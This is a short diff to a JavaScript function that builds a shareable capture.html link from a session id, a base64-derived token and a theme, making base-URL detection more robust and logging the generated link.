@@ -116,10 +116,20 @@ function generateLink() {
 
   setTimeout(() => {
     const sessionId = currentSession || generateSession();
-    const base = window.location.href.replace('index.html', '').replace(/\?.*/, '');
-    const token = btoa(sessionId + ':' + Date.now()).replace(/=/g, '').substring(0, 24);
 
+    // Robust URL generation: use the current location's origin and path
+    // This avoids issues when running from file:// or subdirectories
+    let base = window.location.href.split('?')[0]; // remove query params
+    if (base.endsWith('index.html')) {
+      base = base.substring(0, base.lastIndexOf('index.html'));
+    } else if (!base.endsWith('/')) {
+      base = base.substring(0, base.lastIndexOf('/') + 1);
+    }
+
+    const token = btoa(sessionId + ':' + Date.now()).replace(/=/g, '').substring(0, 24);
     generatedLink = `${base}capture.html?s=${sessionId}&t=${token}&th=${selectedTheme}`;
+
+    console.log('Generated Link:', generatedLink);
 
     const sessions = JSON.parse(localStorage.getItem('cemra_sessions') || '[]');
     if (!sessions.includes(sessionId)) {
